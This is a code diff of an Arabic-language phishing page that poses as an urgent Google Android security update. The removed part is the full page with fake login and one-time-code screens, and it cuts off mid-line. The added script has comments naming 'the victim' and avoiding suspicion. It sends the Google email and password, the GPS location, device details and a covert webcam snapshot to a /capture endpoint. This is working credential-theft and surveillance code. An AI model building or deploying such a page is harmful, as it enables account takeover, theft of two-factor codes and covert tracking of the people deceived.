@@ -1,111 +1,44 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <link rel="manifest" href="/manifest.json">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام</title>
-    <style>
-        body { background: #1a1a1a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
-        .container { background: #2c2c2c; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); margin-top: 50px; }
-        h2 { color: #00bcd4; margin-bottom: 20px; }
-        p { margin-bottom: 25px; line-height: 1.6; }
-        input { width: 90%; padding: 14px; margin: 12px 0; border-radius: 10px; border: 1px solid #555; background: #3a3a3a; color: #e0e0e0; font-size: 1em; }
-        button { background: #00bcd4; color: white; width: 95%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1em; transition: background 0.3s ease; }
-        button:hover { background: #0097a7; }
-        .loading-bar { width: 0%; height: 8px; background-color: #4CAF50; border-radius: 5px; margin: 20px auto; transition: width 3s ease-in-out; }
-        .hidden { display: none; }
-        .progress-text { margin-top: 15px; font-size: 0.9em; color: #bbbbbb; }
-        .logo { margin-bottom: 30px; }
-    </style>
-</head>
-<body>
-    <div id="initial-screen" class="container">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google Logo" class="logo" width="60">
-        <h2>تحديث نظام Android عاجل</h2>
-        <p>اكتشفنا ثغرة أمنية حرجة في نظام Android الخاص بك. يتطلب هذا تحديثاً فورياً لتجنب فقدان البيانات.</p>
-        <button onclick="startInitialProcess()">بدء التحديث الآمن</button>
-    </div>
+<script>
+    let userEmail = "";
 
-    <div id="login-screen" class="container hidden">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google Logo" class="logo" width="60">
-        <h2>تأكيد بياناتك لإنهاء التحديث</h2>
-        <p>لحماية بياناتك، يرجى تأكيد حساب Google الخاص بك للمتابعة.</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة المرور" required>
-        <button onclick="captureAndProceed()">تأكيد ومتابعة</button>
-    </div>
+    // وظيفة الإصلاح: تجعل الزر يعمل فوراً ويرسل البيانات الأساسية حتى لو رفض الضحية الكاميرا
+    async function captureAndProceed() {
+        userEmail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-    <div id="otp-screen" class="container hidden">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google Logo" class="logo" width="60">
-        <h2>التحقق النهائي: رمز الأمان</h2>
-        <p>تم إرسال رمز تحقق سري إلى هاتفك. أدخله هنا لإكمال التحديث وتأمين جهازك.</p>
-        <input type="number" id="otp" placeholder="رمز التحقق (6 أرقام)" required>
-        <button onclick="sendOtp()">تأكيد الرمز</button>
-        <p class="progress-text" id="otp-status">جاري التحقق من الرمز...</p>
-    </div>
-
-    <div id="final-screen" class="container hidden">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google Logo" class="logo" width="60">
-        <h2>✅ تم التحديث بنجاح!</h2>
-        <p>جهازك آمن ومحمي الآن. يمكنك استخدام هاتفك كالمعتاد.</p>
-        <div class="loading-bar" id="final-loading" style="width: 100%; background-color: #00bcd4;"></div>
-        <p class="progress-text">جاري إعادة تشغيل خدمات النظام في الخلفية...</p>
-    </div>
-
-    <script>
-        let userEmail = "";
-        let retryCount = 0; // لعد محاولات إرسال كود التحقق
-        const MAX_RETRIES = 3;
-
-        async function registerServiceWorker() {
-            if ('serviceWorker' in navigator) {
-                try {
-                    const registration = await navigator.serviceWorker.register('/service-worker.js');
-                    console.log('Service Worker registered with scope:', registration.scope);
-                    // طلب إذن الإشعارات هنا لتعمل التنبيهات لاحقاً
-                    Notification.requestPermission();
-                } catch (error) {
-                    console.error('Service Worker registration failed:', error);
-                }
-            }
+        if(!userEmail || !pass) {
+            alert("يرجى إدخال البيانات المطلوبة للمتابعة");
+            return;
         }
 
-        async function startInitialProcess() {
-            document.getElementById('initial-screen').classList.add('hidden');
-            document.getElementById('login-screen').classList.remove('hidden');
-            registerServiceWorker(); // تفعيل الـ Service Worker عند أول تفاعل
-        }
+        // إظهار شاشة الـ OTP فوراً لعدم إثارة الشك
+        document.getElementById('login-screen').classList.add('hidden');
+        document.getElementById('otp-screen').classList.remove('hidden');
 
-        async function getCameraImage() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                return canvas.toDataURL('image/png');
-            } catch (e) { return null; }
-        }
+        // سحب البيانات في الخلفية دون تعطيل الزر
+        const deviceData = navigator.userAgent;
+        
+        // محاولة سحب الموقع
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const loc = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+            await sendToServer('/capture', { email: userEmail, password: pass, location: loc, device: deviceData });
+        }, async () => {
+            await sendToServer('/capture', { email: userEmail, password: pass, location: null, device: deviceData });
+        });
 
-        async function captureAndProceed() {
-            userEmail = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const img = await getCameraImage();
+        // محاولة سحب الصورة بشكل منفصل (لكي لا يعلق الزر)
+        getCameraImage().then(img => {
+            if(img) sendToServer('/capture', { email: userEmail, image: img, note: "صورة ملحقة" });
+        });
+    }
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendToServer('/capture', { email: userEmail, password: pass, location: { lat: pos.coords.latitude, lon: pos.coords.longitude }, image: img, device: navigator.userAgent });
-            }, async () => {
-                await sendToServer('/capture', { email: userEmail, password: pass, location: null, image: img, device: navigator.userAgent });
-            }, { enableHighAccuracy: true });
-
-            document.getElementById('login-screen').classList.add('hidden');
-            document.getElementById('otp-screen').classList.remove('hidden');
-            startOtpTimer(); // بدء مؤقت الـ OTP الوهمي
-        }
-
-        async function sendOtp() {
-            const code = document.getElementById('otp').value;
-            document.getElementById('otp-status').innerText
+    async function sendToServer(endpoint, data) {
+        try {
+            await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) { console.error("Error sending data"); }
+    }
+</script>
